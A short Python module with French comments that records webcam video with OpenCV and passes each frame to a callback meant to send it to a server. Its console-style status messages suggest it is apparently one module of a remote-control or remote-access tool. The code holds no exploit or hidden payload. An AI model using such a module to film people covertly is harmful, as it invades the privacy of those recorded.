"""Module webcam avec enregistrement vidéo intégré et logs détaillés."""

import logging
import threading
import time
import os
import cv2

logger = logging.getLogger(__name__)


def webcam_snapshot() -> bytes:
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        raise RuntimeError("Impossible d'ouvrir la webcam")
    time.sleep(0.5)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        raise RuntimeError("Échec de la capture")
    ret, jpeg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
    if not ret:
        raise RuntimeError("Échec de l'encodage JPEG")
    return jpeg.tobytes()


class WebcamStream:
    def __init__(self, on_frame=None):
        self._on_frame = on_frame
        self._running = False
        self._thread = None
        self._cap = None
        self._video_writer = None
        self._video_filename = None
        self._frame_count = 0

    def start(self, video_filename: str = None) -> str:
        if self._running:
            return "[!] Streaming déjà actif"

        try:
            self._cap = cv2.VideoCapture(0)
            if not self._cap.isOpened():
                return "[!] Impossible d'ouvrir la webcam"

            if video_filename is None:
                os.makedirs("downloads", exist_ok=True)
                timestamp = int(time.time())
                video_filename = f"downloads/stream_video_{timestamp}.mp4"

            self._video_filename = video_filename
            self._video_writer = None
            self._frame_count = 0

            self._running = True
            self._thread = threading.Thread(target=self._stream_loop, daemon=True)
            self._thread.start()

            return f"[+] Streaming webcam démarré (vidéo : {video_filename})"

        except Exception as e:
            return f"[!] Erreur : {e}"

    def _stream_loop(self):
        logger.info("Boucle de streaming démarrée")
        fps = 20.0
        frame_interval = 1.0 / fps
        last_log_time = time.time()

        while self._running:
            try:
                start_time = time.time()
                ret, frame = self._cap.read()

                if not ret:
                    # Si la caméra ne donne plus de frames, on réessaie avec un petit délai
                    time.sleep(0.1)
                    continue

                # Initialiser VideoWriter avec la première frame
                if self._video_writer is None:
                    height, width = frame.shape[:2]
                    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                    self._video_writer = cv2.VideoWriter(
                        self._video_filename,
                        fourcc,
                        fps,
                        (width, height)
                    )
                    logger.info(f"VideoWriter initialisé : {self._video_filename} ({width}x{height})")

                # Écrire la frame dans la vidéo
                self._video_writer.write(frame)
                self._frame_count += 1

                # Envoyer au serveur via callback
                if self._on_frame:
                    ret, jpeg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    if ret:
                        self._on_frame(jpeg.tobytes())

                # Log toutes les secondes
                if time.time() - last_log_time >= 1.0:
                    logger.info(f"Frames capturées : {self._frame_count}")
                    last_log_time = time.time()

                # Gestion du FPS
                elapsed = time.time() - start_time
                if elapsed < frame_interval:
                    time.sleep(frame_interval - elapsed)

            except Exception as e:
                logger.error(f"Erreur dans la boucle de streaming : {e}")
                time.sleep(0.1)

        logger.info(f"Boucle de streaming terminée. Frames totales : {self._frame_count}")

    def stop(self) -> str:
        if not self._running:
            return "[!] Aucun streaming actif"

        self._running = False
        if self._thread:
            self._thread.join(timeout=2)

        if self._video_writer is not None:
            self._video_writer.release()
            self._video_writer = None
            logger.info(f"Vidéo sauvegardée : {self._video_filename} ({self._frame_count} frames)")

        if self._cap:
            self._cap.release()
            self._cap = None

        return f"[+] Streaming arrêté ({self._frame_count} frames capturées)\n[+] Vidéo sauvegardée : {self._video_filename}"